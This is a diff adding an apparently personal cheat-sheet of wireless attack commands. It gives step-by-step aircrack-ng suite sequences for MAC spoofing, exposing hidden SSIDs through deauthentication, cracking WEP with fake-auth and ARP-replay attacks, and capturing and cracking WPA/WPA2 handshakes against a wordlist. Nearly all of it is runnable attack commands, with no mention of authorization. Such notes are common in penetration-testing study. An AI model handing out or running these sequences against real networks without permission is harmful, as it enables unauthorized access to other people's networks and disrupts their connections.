@@ -1,0 +1,72 @@
+OTHER TOOLS:
+    wifite
+    fern wifi cracker (gui)
+    kismet (sniffing)
+    wifi-pumpkin    (turn computer in a wifi pineapple) https://github.com/P0cL4bs/wifipumpkin3
+
+
+DISABLE MAC ADDRESS RANDOMIZATION (MAY INTERFERE WITH SOME ATTACKS)
+    1)  add the line:
+            mac-address-randomization=0
+        to all the files under  /etc/NetworkManager/system-connections in the [connection] section
+    2) service network-manager restart
+
+
+
+
+MAC SPOOFING:
+    #disable mac address randomization
+    1) get BSSID of the target AP
+    2) drop interface ypou want to change:
+        ifconfig wlan0 down
+    3) macchanger -m <target mac address> wlan0
+    4) ifconfig wlan0 up
+
+LOOK FOR HIDDEN NETWORKS:
+    1)  airmon-ng start wlan0
+        //kill all the processes that could cause troubles 
+    2)  airodump-ng wlan0mon
+        //name indicated in the airmon-ng message
+    3)  it will show a list of devices, the hidden ones show no essid or <lenght: 0> as essid
+    4)  to find essid:
+        - leave in a terminal the previous command to continue to check the info intercepted (also do a more specific command to not have too many info)
+        -  execute deauth attack with aireplay:
+            aireplay-ng -0 1 -a <bssid> wlan0mon
+        -now essid should show up in airodump-ng terminal (like before but now it doesn't have zlenth 0> as essid but a real essid)
+
+CRACKING WEP:
+    #start monitor mode
+    airmon-ng start wlan0                   //changes it to wlan0mon (kill the services that interfere with airmon)
+    #look for the target AP
+    airodump-ng wlan0mon
+    #create dump file to capture IV (initialization vectors)
+    airodump-ng -c 6 -w wepdump.cap -bssid 1C:DF:89:84:9F wlan0mon         //-c <channel> -w <output file name> -bssid <bssid> 
+    #fake authentication attack (in another terminal while the other is capturing)
+    aireplay-ng -1 0 -a 1C:DF:89:84:9F wlan0mon            //-1 = fake auth attack, 0 = delay, -a <bssid>
+    #arp replay attack to increase traffic (need at least 15000 data in airodump-ng)
+    aireplay-ng -3 -b 1C:DF:89:84:9F -wlan0mon
+    #crack the key using the file from airdump-ng
+    aircrack-ng wepdump.cap                    //it print something like [ F2:C7:BB:35:B9 ] the key is without braces and columns: F2C7BB35B9
+    #set everything back to normal (close terminals and stop wlan0mon)
+    airmon-ng stop wlan0mon
+    service network-monitor start
+
+CRACKING WPA/WPA2:
+    #monitor mode 
+    airmon-ng start wlan0
+    #start monitoring to find target AP
+    airodump-ng wlan0mon
+    #create output file with captured packets
+    airodump-ng -c 6 -w wpadump.cap -bssid 1C:DF:89:84:9F wlan0mon
+    #wait for a four way handshake to happen (someone connects to the AP) or force it to happen with deauth attack
+    aireplay-ng -0 2 -a 1C:DF:89:84:9F -c 1C:DF:8C:5D.... wlan0mon      //-c <client bssid yopu want to deauth>
+    #in the aerodump-ng terminal now we can see the wpa handshake: 00:1C:DF:89:84:9F (it sgould be on top of the screen)
+    #crack the key
+    aircrack-ng -a2 -b 1C:DF:89:84:9F -w /usr/share/wordlists/rockyou.txt wpadump.cap       //-a2 = wpa2
+
+
+
+OTHER COMMANDS
+    ifconfig wlan0 up 
+    service network-manager restart
+    
